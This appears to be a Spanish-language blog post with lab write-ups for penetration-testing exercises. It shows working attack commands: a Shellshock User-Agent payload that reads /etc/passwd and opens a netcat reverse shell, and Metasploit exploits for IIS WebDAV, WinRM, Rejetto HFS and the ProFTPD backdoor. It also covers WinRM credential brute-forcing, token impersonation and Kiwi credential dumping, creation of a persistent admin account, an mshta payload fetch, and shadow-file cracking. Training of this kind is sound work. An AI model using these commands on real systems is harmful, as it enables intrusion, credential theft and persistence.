---
title: "Resolución de Laboratorios"
date: 2026-04-14 22:39:00 -0500
categories: [Hacking, Vulnerabilidades, Explotación]
tags: [shellshock, Metasploit, privesc, webdav, cracking, kiwi, incognito, powersploit, john]
description: Laboratorios.
toc: true
---

En este post se procederá con el paso a paso para resolver varios laboratorios que permitirán poner en práctica los conocimientos adquiridos en auditoría y explotación de sistemas.

## **Shellshock**
También conocido como **Bashdoor**, es una familia de vulnerabilidades en el intérprete de comandos Bash. Revelada en 2014, permite a un atacante ejecutar comandos arbitrarios a través de variables de entorno, afectando gravemente a servidores web que utilizan scripts CGI.

### 1. Laboratorio de Pruebas (Docker)
Se empieza con una fase de reconocimiento de puertos con Nmap buscando contenedores que contengan scripts ejecutables como (`.cgi`, `.sh`).

**Escaneo con NMAP**
```shell
nmap -p- dominio.com
nmap -sCV -p80 dominio.com
nmap -p 8080 --script http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" dominio.com
```

**Enumeración de Directorios**
Es vital encontrar la ruta del CGI. Usaremos dirb o gobuster:
```shell
dirb http://dominio.com
dirb http://dominio.com -X php,txt,bak,html,cgi,sh,bin
```
> Nota: Fíjate en los códigos de estado. Un 200 OK en /cgi-bin/test.cgi es nuestro punto de entrada.
{: .prompt-warning }

El comando -X permite hacer una fuerza bruta de extensiones.
La extensión .cgi indica que la web podría ser vulnerable a ShellShock sobre Apache. Para más información sobre cómo aprovechar la vulnerabilidad, se puede consultar el repositorio: **[ShellShock](https://github.com/opsxcq/exploit-CVE-2014-6271)**.

El comando para determinar la vulnerabilidad localmente es:
```shell
env x='() { :;}; echo Bash is vulnerable!' bash -c "echo Bash Test"
```
> Nota: Si en consola responde "Bash Test", no es vulnerable. Si responde "Bash is vulnerable", el sistema es atacable.
{: .prompt-warning }

### 2. Explotación de la vulnerabilidad
Primero, activamos Foxy Proxy para interceptar las peticiones con Burp Suite. Al interceptar, modificamos la etiqueta User-Agent, que es el vector vulnerable. Para modificar esta etiqueta se da clic derecho en la petición y se da clic en **Send to Repeater** que es el encargado de modificar la petición y enviar las veces que desee.
```BrupSuite
User-Agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
User-Agent: () { :; }; echo; echo; /bin/bash -c 'which nc'
User-Agent: () { :; }; echo; echo; /bin/bash -c 'ps -ef'
```
Con ese comando imprime el archivo **/etc/passwd** del servidor y a partir de aquí se puede modificar y enviar cualquier tipo de comando al servidor.

Si el servidor tiene netcat instalado, podemos obtener una Reverse Shell desde **[RevShells](https://revshells.com)**:
```shell
User-Agent: () { :; }; echo; echo; /bin/bash -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.1.21 4545 >/tmp/f'
```
En nuestra máquina atacante, escuchamos el puerto:
```shell
nc -nlvp 4545
```
> Ojo: Se debe comprobar la ip de nuestra máquina mediante el comando ip add.
{: .prompt-warning }

## **Windows: IIS Server: WebDav Metasploit**
Iniciamos con el escaneo de servicios y directorios:
```shell
nmap --script http-enum -sV -p80 dominio.com
dirb http://dominio.local/
```

Podemos verificar permisos de escritura con davtest y cadaver. Si tenemos credenciales:
```shell
davtest -auth bob:password_123321 -url http://dominio.local/ 
echo "put shell.php" | cadaver http://dominio.local/uploads --login=bob:password_123321
```

### Explotación con Metasploit
```shell
msfconsole -q
search webdav iis
use exploit/windows/iis/iis_webdav_upload_asp
set rhosts dominio.local
set httpusername bob
set httppassword password_123321
set path /webdav/revershell.asp
exploit
```
Metasploit se encarga de hacer todo el proceso y de levantar el puerto escucha para tener un meterpreter o sesión lista.

## **Vulnerabilidad de WinRM**
El servicio Windows Remote Management corre usualmente en el puerto 5985.

### Ataque con CrackMapExec
Analizamos puertos abiertor.
```shell
ping dominio.local
nmap -p- dominio.local
```
Intentamos fuerza bruta de credenciales:

```shell
crackmapexec -t 1000 winrm dominio.local -u /usr/share/metasploit-framework/data/wordlists/common_user.txt -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```
Con esto prueba con cada uno de los usuarios y contraseñas que tenemos en el sistema. Este comando contiene los siguientes argumentos en donde:
- **-t** significa la cantidad de hilos que se utilizan.
- **winrm** es el servicio a explotar

Tras obtener credenciales, conectamos con **Evil-WinRM**:
```shell
evil-winrm -i dominio.local -u administrator -p tinkerbell
> whoami
> whoami /priv
```
Si no se tiene el permiso de administrador y se tiene el permiso **SeImpersonatePrivilege** se puede escalar privilegios. Los pasos a seguir están en el post Análisis de **Vulnerabilidades y Explotación**.

### Explotación con Metasploit
```shell
msfconsole -q
search winrm logion
use 0
set rhosts dominio.local
set user_file /usr/share/metasploit-framework/data/wordlists/common_user.txt
set pass_file /usr/share/metasploit-framework/data/wordlists/unix_password.txt
set verbose true
set PASSWORD anything
exploit
```
> NOTA: En versiones recientes de MSF, se debe configurar el parámetro PASSWORD con **anything** incluso si se usa un archivo de usuarios.
{: .prompt-warning }

Luego de haber obtenido las credenciales se procede a conseguir acceso meterpreter para ejecutar comandos de la siguiente mandera:
```shell
use exploit/windows/winrm/winrm_script_exec
set rhosts dominio.local
set username administrator
set password tinkerbell
set FORCE_VBS true
exploit
```

## Escalada de Privilegios: Impersonate, Kiwi e Incognito 
Este método funciona mediante la suplantación de token de un usuario. Esto sucede mucho en las empresas ya que al no tener muchos permisos, el administrador se conecta remotamente para instalar programas y esas credenciales se guardan temporalmente en el equipo hasta que este se reinicie.

```shell
nmap -p- dominio.local
nmap -p80,139,445,3389,5985,47001 -sVC --min-rate 5000 -n dominio.local
searchsploit hfs 2.3

msfconsole -q
use exploit/windows/http/rejetto_hfs_exec
set rhosts dominio.local
run
```
Con esto se incia la explotación del servidor de archivos hfs y abre un meterpreter en donde comenzaremos la escalación de privilegios.

### 1. Incognito: Suplantación de Tokens
Este módulo se basa en el manejo de Tokens de Acceso. En Windows, cuando un usuario inicia sesión, se genera un token (como una "llave" maestra). Si un Administrador de Red entró a una máquina para arreglar algo y no cerró sesión correctamente (o si el servicio no ha limpiado el token), esa llave queda flotando en la memoria.

- **¿Cuándo usarlo?:** Cuando tienes una sesión con un usuario con pocos privilegios, pero sospechas que un Administrador ha pasado por ahí.

### 2. Kiwi: El sucesor de Mimikatz
Kiwi es la implementación actualizada de Mimikatz dentro de Metasploit. Su función principal es extraer credenciales, hashes y tickets directamente de la memoria del proceso lsass.exe.

**¿Cuándo usarlo?:** Una vez que ya eres SYSTEM o tienes privilegios altos, para obtener las contraseñas en texto plano o hashes de otros usuarios.

Flujo de trabajo en Meterpreter:


```shell
meterpreter> getuid
    Server username: NT AUTHORITY/LOCAL SERVICE

meterpreter> load kiwi
meterpreter> creds_all
    fail
meterpreter> hashdump
    fail

meterpreter> load incognito
meterpreter> list_tokens -u #Revisamos tokens almacenados en el sistema
meterpreter> impersonate_token ATTACKDEFENSE\\Administrator
    Successfully impersonated user ATTACKDEFENSE\\Administrator
meterpreter> getuid
    Server username: NT AUTHORITY\Administrator
meterpreter> getsystem
    Named Pipe Impersonation (In Memory Admin)
meterpreter> getuid
    Server username: NT AUTHORITY\SYSTEM
meterpreter> hashdump
meterpreter> creds_all
meterpreter> lsa_dump_sam #Dump a diferentes hashes de usuario
```
Si logramos ser SYSTEM, podemos crear un usuario persistente para RDP:
```shell
meterpreter> shell
> net user administrator2 password /add
> net localgroup administrators administrator2 /add
```
Ahora desde otro terminal procedemos a conectarnos a RDP y se puede ver cómo al hacer un creds_all muestra las contraseñas en texto plano.
```shell
rdesktop dominio.local
```
Con este proceso se ha logrado escalar privilegios mediante el módulo de Incógnito.

#### Diferencias entre Incognito y Kiwi
- **Incognito** se usa para moverte entre identidades (suplantar) sin necesariamente romper la seguridad del sistema, solo aprovechando lo que quedó en memoria.

- **Kiwi** se usa para extraer información sensible que te permita persistencia o movimiento lateral (conocer la clave real).

## UNATTENDED INSTALLATION (Instalación Desatendida)
### Windows (PowerUp.ps1)
Powerup.ps1 es un script parecido al escalador de privilegios en linux, que se encarga de ver vulnerabilidades y fallos que tienen los sistemas. Este script se puede encontrar en github. Para la práctica este repositorio está ubicado en la carpeta escritorio y se procede de la siguiente manera:

```shell
cd \Desktop\PowerSploit\Privesc
ls
    PowerUp.ps1
```
Usamos el script PowerUp.ps1 para buscar archivos mal configurados:
```powershell
powershell -ep bypass # (PowerShell execution policy bypass)
. .\PowerUp.ps1
Invoke-PrivescAudit
```
![Powershell - PowerUp.ps1](/assets/img/Primer-Blog/powershell.jpg){: width=auto }
_Invoke-privescAudit_

Este resultado nos muestra que tenemos una ruta Unattended Path con un archivo llamado **unattended.xml**, donde tenemos información bastante importante. Esto se guarda por hacer automatizaciones o instalar un programa.

Si encontramos un archivo unattended.xml, revisamos su contenido en busca de credenciales:
```powershell
type unattended.xml
```
![Powershell - PowerUp.ps1](/assets/img/Primer-Blog/unattended.jpg){: width=auto }
_unattended.xml_

Para decodificar una contraseña en Base64 desde PowerShell:
```powershell
$password=`QWRtaW5AMTIz`
$password=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($password))
echo $password
Admin@123
```
Descifrada la contraseña, ahora podemos conectarnos con credenciales de otro usuario mediante la herramienta **runas.exe**.

```powershell
runas.exe /user:administrator cmd
Admin@123
whoami
```
Con el comando anterior abre una shell tipo administrador en la que podemos interactuar.

### Linux (HTA Server)
En Metasploit, podemos usar un servidor HTA para obtener una shell inicial si un administrador ejecuta el comando:
```shell
msfconsole -q
use exploit/windows/misc/hta_server
set target 1
set payload windows/x64/meterpreter/reverse_tcp
exploit
```
Este exploit ayuda a correr un paload vía powershell. Generando una URL servidor escucha a la espera de que alguien le ejecute en windows con un usuario administrador, para ello se utiliza el siguiente comando.
```shell
mshta.exe http://10.10.31.2:80/Bn75U0NL80NS.hta
```

## Password Cracking en Linux
El crackeo de contraseñas es lo más importante ya que con esto nos puede llevar a la escalación de privilegios.
```shell
nmap -p- dominio.local
nmap -p21 -sCV dominio.local
searchsploit proftpd1.3.3c
```
> NOTA: Si al buscar con searchsploit la versión exacta no se encuentra, se puede ir reduciendo un nivel de la versión.
{: .prompt-warning }

Al encontrar que si posee esa versión una vulnerabilidad, se procede con metasploit para la explotación.

```shell
msfconsole -q
search proftpd 1.3.3c
use exploit/unix/ftp/proftpd_133c_backdoor
set rhost dominio.local
set payload cmd/unix/reverse
set lhost eth1
run
```
Al realizar esto ya se tiene completo la sesión abierta y se procede con los comandos básicos para analizar al sistema. En caso de que el sistema nos devuelva una shell con acceso root, en ciertos desafíos solicitan las credenciales del usuario que aún no tenemos.
```shell
id
whoami
```

Para saber las credenciales se puede utilizar 3 formas distintas:

1. La primera manera es con el módulo de metasploit llamado hashdump:

```shell
msfconsole -q
use post/linux/gather/hashdump
set session 1
exploit
```
Con este módulo podremos saber la contraseña en texto plano del usuario root.

2. La segunda forma de descifrar la contraseña es con otro módulo llamado crack_linux:
```shell
msfconsole -q
use auxiliary/analyze/crack_linux
set SHA512 true
run
```

3. La tercer forma más sencilla es dentro de la sesión abierta, ejecutar lo siguiente:

```shell
cat /etc/passwd #Copiar todo el resultado
nano password #Pegar en este archivo el resultado de passwd
cat /etc/shadow #Copiar todo el resultado
nano contra #Pegar en este archivo el resultado de shadow

unshadow password contra > hashes.txt
cat hashes.txt #Con esto hacemos una combinación los dos archivos en 1 solo
john hashes.txt #Con esto John detecta automáticamente el tipo de hash que tiene el archivo
john hashes.txt --show

#En caso que no detecte el formato se procede con el siguiente
john --format=crypt hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

> NOTA: Jonh the Ripper solo muestra el resultado 1 vez y tiene una ruta en donde guarda todos los crackeos /root/.jhon/john.pot
{: .prompt-warning }

## Conclusión
La resolución de estos laboratorios demuestra que la seguridad no es un estado estático, sino un proceso de capas. Desde vulnerabilidades clásicas como Shellshock hasta fallos de configuración en servicios de Windows como WinRM o archivos de instalación desatendida (Unattended), el vector de ataque siempre aprovecha el eslabón más débil: la falta de actualización o el manejo inadecuado de credenciales. Como auditores, entender estas rutas de explotación es vital para fortalecer las defensas y mitigar riesgos antes de que un actor malintencionado los explote.